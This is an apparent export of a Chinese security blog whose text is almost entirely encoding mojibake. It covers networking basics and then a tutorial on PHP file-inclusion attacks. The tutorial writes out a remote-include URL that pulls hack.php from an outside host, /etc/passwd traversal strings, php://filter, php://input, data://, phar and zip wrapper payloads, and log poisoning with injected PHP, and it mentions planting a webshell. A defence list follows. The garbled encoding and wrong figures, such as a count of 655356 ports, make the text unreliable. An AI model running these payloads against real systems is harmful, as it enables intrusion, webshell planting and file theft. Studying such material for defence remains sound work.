¹æ®æœ¬æœºé…ç½®çš„ç½‘å…³åœ°å€ï¼ŒæŸ¥è¯¢arpç¼“å­˜è¡¨æˆ–è€…å¹¿æ’­æŸ¥è¯¢ç½‘å…³çš„macåœ°å€ï¼Œå®Œæˆåå°è£…å¸§å¤´å¸§å°¾ï¼Œç„¶åæ•°æ®è¢«å‘é€ç½‘å…³ï¼Œç”±ç½‘å…³è¿›è¡Œåœ°å€è½¬æ¢ï¼Œç„¶åå±‚å±‚è·¯ç”±åˆ°æœåŠ¡å™¨ç«¯ã€‚</p>
<h2 id="step4ï¼šæœåŠ¡å™¨è§£æè¯·æ±‚ï¼Œå‘é€æ•°æ®"><a href="#step4ï¼šæœåŠ¡å™¨è§£æè¯·æ±‚ï¼Œå‘é€æ•°æ®" class="headerlink" title="step4ï¼šæœåŠ¡å™¨è§£æè¯·æ±‚ï¼Œå‘é€æ•°æ®"></a>step4ï¼šæœåŠ¡å™¨è§£æè¯·æ±‚ï¼Œå‘é€æ•°æ®</h2><hr>
<p>æœåŠ¡å™¨æ ¹æ®è¯·æ±‚å†…å®¹è¿”å›ç›¸åº”å†…å®¹ï¼Œå¦‚æœè¯·æ±‚çš„æ˜¯é™æ€ç½‘é¡µï¼Œå°†ç›´æ¥ç”±webä¸­é—´ä»¶æ ¹æ®urlä¸­è¯·æ±‚çš„å†…å®¹è¿”å›å¯¹åº”çš„æ•°æ®ï¼Œå¦‚æœè¯·æ±‚çš„æ˜¯åŠ¨æ€çš„é¡µé¢ï¼Œåˆ™webä¸­é—´ä»¶å°†è¯·æ±‚é€šè¿‡socketå‘é€åˆ°åŠ¨æ€è„šæœ¬è§£æå™¨è§£ææ‰§è¡Œï¼Œè§£æå™¨è‹¥å‘ç°éœ€è¦æŸ¥è¯¢æ•°æ®åº“ï¼Œåˆ™ä¼šè¿æ¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢å¹¶å°†æ•°æ®æ·»åŠ åˆ°ç»“æœä¸­ï¼Œè„šæœ¬è§£æå™¨è§£æå®Œåï¼Œå°†æ•°æ®å‘å›ç»™webä¸­é—´ä»¶ï¼Œwebä¸­é—´ä»¶å†å‘å›ç»™æµè§ˆå™¨ã€‚</p>
<h2 id="step5ï¼šæ–­å¼€è¿æ¥"><a href="#step5ï¼šæ–­å¼€è¿æ¥" class="headerlink" title="step5ï¼šæ–­å¼€è¿æ¥"></a>step5ï¼šæ–­å¼€è¿æ¥</h2><hr>
<p>å½“æµè§ˆå™¨æ²¡æœ‰è¦å‘é€çš„æ•°æ®æ—¶ï¼ŒæœåŠ¡å™¨é¦–å…ˆå‘é€ä¸€ä¸ªç»“æŸæŠ¥æ–‡ï¼Œæˆ‘ä»¬ç§°å…¶ä¸ºæ‰§è¡Œä¸»åŠ¨å…³é—­ï¼Œè¯¥æŠ¥æ–‡ä¸­finæ ‡å¿—ä½è®¾ç½®ä¸º1ï¼Œackæ ‡å¿—ä½è®¾ç½®ä½1ï¼Œsynæ ‡å¿—ä½è®¾ç½®ä½0ï¼ŒåŒæ­¥åºåˆ—å·ä¸ºx,ç¡®è®¤å·è®¾ç½®ä¸ºz,æ­¤æ—¶æœåŠ¡å™¨å…³é—­å…¶å‘é€æ•°æ®æœåŠ¡ï¼Œä½†ä»ç„¶å¯ä»¥æ¥å—æ¥è‡ªæµè§ˆå™¨çš„æ•°æ®ï¼Œæµè§ˆå™¨æ¥æ”¶åˆ°åå›å¤æœåŠ¡å™¨ä¸€ä¸ªackæŠ¥æ–‡ï¼Œè¡¨ç¤ºå·²ç»æ¥æ”¶åˆ°äº†æœåŠ¡å™¨çš„ç»“æŸè¿æ¥è¯·æ±‚ï¼Œè®¾ç½®ackæ ‡å¿—ä½ä¸º1ï¼Œsynæ ‡å¿—ä½ä½0ï¼Œfinæ ‡å¿—ä½ä¸º0ï¼ŒåŒæ­¥åºåˆ—å·ä¸ºz,æ­¤æ—¶å¦‚æœæµè§ˆå™¨ä»ç„¶æœ‰è¯·æ±‚ï¼Œä»ç„¶å¯ä»¥å‘é€ç»™æœåŠ¡å™¨ï¼Œç­‰åˆ°æµè§ˆå™¨æ²¡æœ‰è¯·æ±‚å‘é€åï¼Œå…¶ä¼šå‘é€ä¸€ä¸ªå¸¦æœ‰fin+ackæ ‡å¿—ä½çš„åŒ…ç»™æœåŠ¡å™¨ï¼Œå¹¶è®¾ç½®ç¡®è®¤å·ä½Xï¼ŒåŒæ­¥åºåˆ—å·ä½Yè¡¨ç¤ºæ²¡æœ‰æ•°æ®å†å‘é€ç»™æœåŠ¡å™¨äº†ï¼Œè¿›å…¥lask_ackçŠ¶æ€ï¼Œå½“æœåŠ¡å™¨æ”¶åˆ°è¯¥æŠ¥æ–‡åï¼Œå‘é€ä¸€ä¸ªå¸¦æœ‰ackæ ‡è®°çš„åŒ…ç»™æµè§ˆå™¨ï¼ŒåŒæ­¥åºåˆ—å·è®¾ç½®ä¸ºXï¼Œæ­¤æ—¶æœåŠ¡å…¶è¿›å…¥æœ€ç»ˆç¡®è®¤çŠ¶æ€fn_ack ,å¾…ç­‰å¾…äº†2msl(2å€æŠ¥æ–‡æœ€å¤§ç”Ÿå­˜æ—¶é—´)åï¼ŒæœåŠ¡å™¨é‡Šæ”¾è¿æ¥ã€‚</p>
<h2 id="step6ï¼šæµè§ˆå™¨è§£æã€æ¸²æŸ“æ•°æ®"><a href="#step6ï¼šæµè§ˆå™¨è§£æã€æ¸²æŸ“æ•°æ®" class="headerlink" title="step6ï¼šæµè§ˆå™¨è§£æã€æ¸²æŸ“æ•°æ®"></a>step6ï¼šæµè§ˆå™¨è§£æã€æ¸²æŸ“æ•°æ®</h2><hr>
<p>å®¢æˆ·ç«¯æ”¶åˆ°æ•°æ®åï¼Œç»è¿‡å±‚å±‚çš„è§£å°è£…ã€é‡ç»„ç­‰æ“ä½œæœ€ç»ˆå°†æ•°æ®å‘é€åˆ°æµè§ˆå™¨ã€‚æµè§ˆå™¨æ¥å—åˆ°æ•°æ®åé¦–å…ˆå°†htmlä»£ç æ„é€ æˆDOMæ ‘ï¼Œcssæ–‡ä»¶æ„é€ æˆCSSOM,è¿™ä¸¤ä¸ªè¿‡ç¨‹æ˜¯åŒæ­¥è¿›è¡Œï¼Œç„¶åæµè§ˆå™¨åˆå¹¶è¿™ä¸¤æ£µæ ‘ï¼Œç”Ÿæˆæ¸²æŸ“æ ‘ï¼Œæœ€åè¿›è¡Œé‡æ„ï¼Œæ¸²æŸ“ç­‰æ“ä½œå¾—åˆ°æˆ‘ä»¬çœ‹åˆ°çš„ç½‘é¡µ</p>
<h1 id="QUESTION2ï¼šä¸€å°è®¡ç®—æœºæœ€å¤šå¯ä»¥æœ‰å¤šå°‘ä¸ªç½‘ç»œç«¯å£ï¼ˆé€»è¾‘ï¼‰ï¼Ÿ"><a href="#QUESTION2ï¼šä¸€å°è®¡ç®—æœºæœ€å¤šå¯ä»¥æœ‰å¤šå°‘ä¸ªç½‘ç»œç«¯å£ï¼ˆé€»è¾‘ï¼‰ï¼Ÿ" class="headerlink" title="QUESTION2ï¼šä¸€å°è®¡ç®—æœºæœ€å¤šå¯ä»¥æœ‰å¤šå°‘ä¸ªç½‘ç»œç«¯å£ï¼ˆé€»è¾‘ï¼‰ï¼Ÿ"></a>QUESTION2ï¼šä¸€å°è®¡ç®—æœºæœ€å¤šå¯ä»¥æœ‰å¤šå°‘ä¸ªç½‘ç»œç«¯å£ï¼ˆé€»è¾‘ï¼‰ï¼Ÿ</h1><p><strong>å…±æœ‰655356ä¸ªç«¯å£</strong></p>
<ol>
<li>0-1023 å…¬è®¤ç«¯å£ï¼Œä¸€èˆ¬éƒ½æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼Œä¸ªäººåœ¨åˆ†é…ç«¯å£çš„æ—¶å€™ä¸€èˆ¬ä¸ä½¿ç”¨è¿™äº›ç«¯å£</li>
<li>1024-49151 æ³¨å†Œç«¯å£ï¼šè¿™äº›ç«¯å£å¯ä»¥ç”¨äºç»‘å®šä¸€äº›æœåŠ¡</li>
<li>49152-65535 ç§æœ‰ç«¯å£ï¼šè¿™äº›ç«¯å£æˆ‘ä»¬åœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨</li>
</ol>
<h1 id="QUESTION3ï¼š127-0-0-1åœ¨ç½‘ç»œå®‰å…¨å’Œæµ‹è¯•ä¸­çš„ç°å®æ„ä¹‰æœ‰å“ªäº›ï¼Ÿ"><a href="#QUESTION3ï¼š127-0-0-1åœ¨ç½‘ç»œå®‰å…¨å’Œæµ‹è¯•ä¸­çš„ç°å®æ„ä¹‰æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="QUESTION3ï¼š127.0.0.1åœ¨ç½‘ç»œå®‰å…¨å’Œæµ‹è¯•ä¸­çš„ç°å®æ„ä¹‰æœ‰å“ªäº›ï¼Ÿ"></a>QUESTION3ï¼š127.0.0.1åœ¨ç½‘ç»œå®‰å…¨å’Œæµ‹è¯•ä¸­çš„ç°å®æ„ä¹‰æœ‰å“ªäº›ï¼Ÿ</h1><p>ä¸€èˆ¬ç”¨ä½œæµ‹è¯•ç”¨ï¼Œå¯ä»¥ç”¨äºæµ‹è¯•æœ¬æœºçš„ç½‘ç»œé…ç½®æ˜¯å¦æˆåŠŸï¼Œå¯ä»¥ç”¨äºæœ¬æœºåº”ç”¨é—´çš„é€šä¿¡</p>
<h1 id="QUESTION3ï¼šéƒ¨ç½²ç½‘ç«™çš„ä½“ä¼š"><a href="#QUESTION3ï¼šéƒ¨ç½²ç½‘ç«™çš„ä½“ä¼š" class="headerlink" title="QUESTION3ï¼šéƒ¨ç½²ç½‘ç«™çš„ä½“ä¼š"></a>QUESTION3ï¼šéƒ¨ç½²ç½‘ç«™çš„ä½“ä¼š</h1><p>æˆ‘åœ¨éƒ¨ç½²è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯PHPç‰ˆæœ¬ä¸åŒ¹é…çš„é—®é¢˜ï¼Œæˆ‘ä½¿ç”¨çš„PHPç‰ˆæœ¬æ—¶7.3ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„PHPä¸è€çš„ç‰ˆæœ¬çš„PHPæœ‰è¾ƒå¤§çš„å·®åˆ«ï¼Œå°±æˆ‘æ‰€çŸ¥é“çš„ï¼Œ7.3ç‰ˆæœ¬é‡Œé¢å•æ¡mysqlå•æ¡æŸ¥è¯¢è¯­å¥çš„æ‰§è¡Œå‡½æ•°æ—¶mysqli_query(),è€Œè€ç‰ˆæœ¬çš„PHPä¸­ç¡®æ˜¯mysql_qureyï¼Œæ‰€ä»¥æˆ‘åœ¨å‘å¸ƒç½‘ç«™ä¹‹åï¼Œè®¿é—®é¡µé¢æ˜¯ä¸€ç‰‡ç©ºç™½ã€‚è¿™ä¸ªé—®é¢˜æˆ‘åœ¨éƒ¨ç½²sqli_labsçš„æ—¶å€™ä¹Ÿé‡åˆ°è¿‡ï¼Œä¸è¿‡å½“æ—¶æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘å¾ˆå¿«å°±æ‰¾åˆ°äº†é—®é¢˜çš„æ ¹æºï¼Œä½†è¿™æ¬¡å´æ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œæ‰€ä»¥æµªè´¹äº†å¾ˆå¤šçš„æ—¶é—´ï¼Œè¿˜å‘åˆ˜ä¿Šå²‘è¯·æ•™äº†ä¸€ä¸‹ï¼Œæˆ‘æ–¹æ‰å¤§å½»å¤§æ‚Ÿï¼Œå¯èƒ½æ˜¯PHPç‰ˆæœ¬ä¸å…¼å®¹å¯¼è‡´çš„ï¼Œ åœ¨æˆ‘ä½¿ç”¨äº†ä½ç‰ˆæœ¬çš„PHPåï¼Œè¿™ä¸ªé—®é¢˜æœç„¶è¢«è§£å†³äº†ã€‚</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>æµè§ˆå™¨</category>
      </categories>
      <tags>
        <tag>æµè§ˆå™¨</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶åŒ…å«æ¼æ´</title>
    <url>/archives/4089de4e.html</url>
    <content><![CDATA[<h1 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ–‡ä»¶åŒ…å«æ¼æ´</h1><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>æœåŠ¡ç«¯æä¾›äº†ä»å¦ä¸€ä¸ªé¡µé¢åŠ è½½å¦ä¸€ä¸ªé¡µé¢çš„åŠŸèƒ½ï¼Œä¸”è¯¥åŠŸèƒ½çš„æ¥å£æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œç”±äºç¨‹åºæœªå¯¹ç”¨æˆ·çš„è¾“å…¥åšä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæˆ–è€…è¿‡æ»¤ä¸å¤Ÿä¸¥è°¨ï¼Œå°±å¯èƒ½å¯¼è‡´æ–‡ä»¶åŒ…å«çš„æ¼æ´ã€‚æ–‡ä»¶åŒ…å«çš„å‡½æ•°åˆinclude\include_once_onceï¼Œincludeåœ¨åŒ…å«ä¸€ä¸ªæ–‡ä»¶æ—¶å¦‚æœå‡ºé”™åªä¼šæŠ›å‡ºè­¦å‘Šï¼Œç¨‹åºè¿˜æ˜¯ä¼šç»§ç»­æ‰§è¡Œï¼Œrequireåˆ™ä¼šç›´æ¥ç»“æŸï¼Œè¿˜æœ‰å¯èƒ½æ˜¯file_get_contengsã€‚è¿™å†™å‡½æ•°å°†ç›´æ¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†æ–‡ä»¶å†…å®¹åŸæ ·è¾“å‡ºåˆ°è¦åŒ…å«æ–‡ä»¶çš„æ–‡ä»¶ä¸­ï¼Œå› ä¸ºè¯¥æ–‡ä»¶æ‹¥æœ‰åˆä¹è§„åˆ™çš„æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥ï¼Œè¢«åŒ…å«æ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç å°†è¢«æ‰§è¡Œã€‚æˆ‘ä»¬åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ä¸Šä¼ çš„å›¾ç‰‡é©¬å¾€å¾€å°±åˆ©ç”¨æ–‡ä»¶åŒ…å«çš„è¿™ä¸ªç‰¹æ€§å¾—ä»¥æ‰§è¡Œã€‚</p>
<p><code>éœ€è¦å¼€å¯allow_url_include å’Œ allow_url_fopen</code> å…è®¸æ–‡ä»¶åŒ…å«å’Œå…è®¸è¯»å–æ–‡ä»¶</p>
<h1 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h1><p>å¯ä»¥ä½¿ç”¨httpåè®®ä»è¿œç¨‹åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç åˆ°ç›®æ ‡æ–‡ä»¶</p>
<p><code>?file=http://www.baidu.com/hack.php</code> ä»»æ„æ–‡ä»¶åç¼€éƒ½å¯ä»¥</p>
<h1 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h1><p>é…åˆç›®å½•ç©¿è¶Šæ¼æ´ï¼Œè·å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„æ•æ„Ÿæ–‡ä»¶ã€æ‰§è¡Œphpä»£ç </p>
<p><strong>ç›®å½•ç©¿è¶Šï¼š</strong> ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
<h3 id="sessionæ–‡ä»¶åŒ…å«"><a href="#sessionæ–‡ä»¶åŒ…å«" class="headerlink" title="sessionæ–‡ä»¶åŒ…å«"></a>sessionæ–‡ä»¶åŒ…å«</h3><p>åˆ©ç”¨phpé»˜è®¤çš„sessionå­˜å‚¨è·¯å¾„åŠæ¥å®ç°æ¶æ„ä»£ç æ‰§è¡Œ</p>
<p>linux sessionæ–‡ä»¶åœ¨ç›®å½•<code>/var/lib/php/session</code>ä¸­ï¼Œå¯ä»¥é€šè¿‡phpinfoæœç´¢<code>session_save_path</code>æŸ¥çœ‹ï¼Œsessionæ–‡ä»¶çš„å‘½åè§„åˆ™æ˜¯<code>sess_phpsessionid</code> sessionæˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ“åŒ…è·å–ã€‚å¦‚æœç”¨æˆ·ä¸Šä¼ çš„å‚æ•°è¢«å†™å…¥åˆ°sessionä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œæ¶æ„ä»£ç ï¼Œå‰ææ˜¯å½“å‰phpä¸­é—´ä»¶å…·æœ‰å¯¹sessionæ–‡ä»¶åŠå…¶çˆ¶ç›®å½•çš„è¯»æƒé™ã€‚</p>
<h3 id="sshlogæ–‡ä»¶åŒ…å«"><a href="#sshlogæ–‡ä»¶åŒ…å«" class="headerlink" title="sshlogæ–‡ä»¶åŒ…å«"></a>sshlogæ–‡ä»¶åŒ…å«</h3><p>åˆ©ç”¨sshçš„æ—¥å¿—ä¿¡æ¯ï¼Œé€šè¿‡sshç™»å½•æ—¶å°†æ¶æ„ä»£ç å†™å…¥åˆ°ç”¨æˆ·åéƒ¨åˆ†ï¼Œå†åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚</p>
<p>sshé»˜è®¤æ—¥å¿—è·¯å¾„ï¼š<code>/var/log/auth.log</code></p>
<p>sshç™»å½•å§¿åŠ¿ï¼šssh @192.168.0.102</p>
<p>æ—¥å¿—æ–‡ä»¶ä¸­è®°å½•</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled.png"></p>
<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled.png</p>
<h3 id="apache2è®¿é—®æ—¥å¿—ï¼Œé”™è¯¯æ—¥å¿—"><a href="#apache2è®¿é—®æ—¥å¿—ï¼Œé”™è¯¯æ—¥å¿—" class="headerlink" title="apache2è®¿é—®æ—¥å¿—ï¼Œé”™è¯¯æ—¥å¿—"></a>apache2è®¿é—®æ—¥å¿—ï¼Œé”™è¯¯æ—¥å¿—</h3><p>æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼š<code>/var/log/apache2/access.log|error.log</code></p>
<p>åˆ©ç”¨æ–¹å¼ï¼šç›´æ¥è®¿é—®ä¸å­˜åœ¨çš„è·¯å¾„ï¼š<code>http://www.armandhe.com/&lt;?php phpinfo();?&gt;</code> å› ä¸ºurlä¸­çš„æ•°æ®ä¼šè¢«ç¼–ç ï¼Œæ‰€ä»¥åœ¨è®¿é—®çš„æ—¶å€™éœ€è¦æŠ“åŒ…åï¼Œä¿®æ”¹ä¸Šä¼ å‚æ•°ä¸ºä¸ºç¼–ç çš„æ ¼å¼ã€‚</p>
<p><strong>é‚£ä¹ˆmysqlçš„è®¿é—®æ—¥å¿—æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥åšåŒæ ·çš„æ“ä½œ</strong></p>
<p><strong>ä¸Šè¿°è®¿é—®æ—¥å¿—çš„æ–¹å¼æœ‰ä¸€ä¸ªå‰ææ¡ä»¶å°±æ˜¯phpè¦æœ‰è¯»è¿™äº›ç›®å½•ä»¥åŠæ–‡ä»¶çš„æƒé™</strong></p>
<h1 id="ç»•è¿‡å§¿åŠ¿"><a href="#ç»•è¿‡å§¿åŠ¿" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h1><h3 id="æœ¬åœ°æ–‡ä»¶åŒ…å«æœ‰é™åˆ¶çš„æŸ“è¿‡"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«æœ‰é™åˆ¶çš„æŸ“è¿‡" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«æœ‰é™åˆ¶çš„æŸ“è¿‡"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«æœ‰é™åˆ¶çš„æŸ“è¿‡</h3><p>%00æˆªæ–­</p>
<p>è·¯åŠ²é•¿åº¦æˆªæ–­</p>
<p><strong>ä¸€ä¸ªç‰¹æ€§ï¼šlinuxä¸­ç›®å½•æœ€é•¿ä¸è¶…è¿‡4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†å°†è¢«ä¸¢å¼ƒï¼Œwindowsä¸­ç›®å½•æœ€é•¿ä¸è¶…è¿‡256å­—èŠ‚ï¼Œè¶…è¿‡çš„å°†è¢«ä¸¢å¼ƒ</strong></p>
<p>é€šè¿‡â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦æˆ–è€…..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;æˆªæ–­</p>
<h3 id="è¿œç¨‹æ–‡ä»¶åŒ…å«ç»•è¿‡"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«ç»•è¿‡" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«ç»•è¿‡"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«ç»•è¿‡</h3><p>ï¼Ÿ# spaceç©ºæ ¼</p>
<h3 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h3><p><strong>php:&#x2F;&#x2F;filter â€”â€”â€”-è¯»å–æœ¬åœ°æ–‡ä»¶ åªéœ€å¼€å¯allow_url_fopen</strong></p>
<p><code>?file=php://filter/convert.base64-encode/resource=file://c:/windows/win.ini</code></p>
<p>æœ‰äº›æ–‡ä»¶ä¸­åŒ…å«ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œç›´æ¥ç”¨fileåè®®å¯èƒ½æ— æ³•è¯»å–æˆåŠŸï¼Œæ‰€ä»¥å…ˆè¿›è¡Œbaseç¼–ç ä¹‹åå†æ¥ä¼ è¾“ã€‚</p>
<p><strong>php:&#x2F;&#x2F;inputâ€”â€”â€”â€”â€”è¯»å–postæ•°æ® éœ€åŒæ—¶å¼€å¯ä¸¤ä¸ªé…ç½®é¡¹</strong></p>
<p>å½“ä»£ç ä¸­å¤„ç†ç”¨æˆ·ä¸Šä¼ æ•°æ®ä½¿ç”¨çš„æ˜¯file_get_contentsçš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨è¯¥åè®®</p>
<p>è¯¥å‡½æ•°è·å–åŸå§‹postè¯·æ±‚çš„æ–¹å¼æ˜¯<code>file_get_contents(&quot;php://input&quot;)</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†<code>php://input</code> ä½œä¸ºå‚æ•°ä¼ ä¸Šå»ï¼Œè€Œå…·ä½“çš„postå†…å®¹é€šè¿‡æŠ“åŒ…æ›´æ”¹è¯·æ±‚å¤´ç±»å‹ï¼Œæ·»åŠ è¯·æ±‚ä½“æ¥å®ç°ã€‚</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%201.png"></p>
<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%201.png</p>
<p>å¯ä»¥ç›´æ¥åœ¨å½“å‰ç›®å½•ä¸­å†™å…¥æœ¨é©¬ï¼Œç„¶åç”¨èšå‰‘é“¾æ¥</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%202.png"></p>
<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%202.png</p>
<p>æˆ–è€…ç›´æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%203.png"></p>
<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%203.png</p>
<p><strong>file:&#x2F;&#x2F; â€”â€”â€”â€”â€”è¯»å–æœ¬åœ°æ–‡ä»¶</strong></p>
<p><code>?file=file:///etc/passwd</code></p>
<p><strong>data:&#x2F;&#x2F;â€”â€”â€”â€”è¯»å–æœ¬åœ°æ–‡ä»¶ é…åˆfile_get_contentsä½¿ç”¨</strong></p>
<p><code>?file=data://text/plain;base64,cGhwaW5mbygpOw==</code></p>
<p><strong>phar:&#x2F;&#x2F;â€”â€”â€”â€”è§£å‹ç¼© æœ‰æ•ˆ</strong></p>
<p><code>?file=phar://hack.png/hack.php</code> hackå®é™…ä¸Šæ˜¯ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œåªä¸è¿‡åç¼€ååœ¨å‹ç¼©å®Œæˆåè¢«æ‰‹åŠ¨ä¿®æ”¹ä¼ªpngæ¥ç»•è¿‡è¿‡æ»¤ç­–ç•¥ï¼Œä¸”å‹ç¼©çš„æ ¼å¼å¿…é¡»ä¸ºzipã€‚å¯ä»¥é…åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ä½¿ç”¨</p>
<p><strong>zip:&#x2F;&#x2F;â€”â€”â€”â€”-è§£å‹ç¼© æœ‰æ•ˆ</strong></p>
<p><code>?file=zip://hack.png#hack.php</code> hackæ–‡ä»¶æ˜¯åœ¨hack.zipä¸­çœŸå®å­˜åœ¨çš„ï¼Œhackæ˜¯å‹ç¼©æ–‡ä»¶å‹ç¼©åä¿®æ”¹çš„åç¼€åä¸ºpngã€‚åŠŸèƒ½å’Œpharä¸€æ ·</p>
<p><strong>æµ‹è¯•ä»£ç </strong>fang</p>
<p><a href="hack.zip">hack.zip</a></p>
<p><a href="pharTest.php">pharTest.php</a></p>
<h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p>å…³é—­allow_url_include</p>
<p>å°†open_basedir è®¾ç½®ä¸ºæŒ‡å®šç›®å½•ï¼Œå³åªå…è®¸è¯¥ç›®å½•æ–‡ä»¶è¢«è®¿é—®ã€‚</p>
<p>è®¾ç½®ç™½åå•</p>
<p>è®¾ç½®é»‘åå•ï¼Œè¿‡æ»¤å±é™©åè®®å…³é”®å­—ï¼Œ</p>
<h1 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a>å±å®³</h1><ol>
<li>æ•æ„Ÿæ–‡ä»¶æ³„éœ²</li>
<li>è¢«getshell</li>
<li>ä»»æ„å‘½ä»¤æ‰§è¡Œ</li>
</ol>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
        <tag>PHP</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘ç«™æ¶æ„å‘å±•</title>
    <url>/archives/4d872363.html</url>
    <content><![CDATA[<h1 id="ç½‘ç«™æ¶æ„å‘å±•"><a href="#ç½‘ç«™æ¶æ„å‘å±•" class="headerlink" title="ç½‘ç«™æ¶æ„å‘å±•"></a>ç½‘ç«™æ¶æ„å‘å±•</h1><h2 id="åˆå§‹é˜¶æ®µçš„æ¶æ„"><a href="#åˆå§‹é˜¶æ®µçš„æ¶æ„" class="headerlink" title="åˆå§‹é˜¶æ®µçš„æ¶æ„"></a>åˆå§‹é˜¶æ®µçš„æ¶æ„</h2><p>æœ€åˆçš„æ¶æ„æ‰€æœ‰çš„æœåŠ¡å™¨éƒ½åœ¨åŒä¸€å°æœºå™¨ä¸Šé¢ï¼Œæ²¡æœ‰å¤ªå¤šçš„ç”¨æˆ·è®¿é—®ï¼Œä¸å­˜åœ¨æ€§èƒ½ç“¶é¢ˆ</p>
<p><img src="/archives/4d872363/Untitled.png"></p>
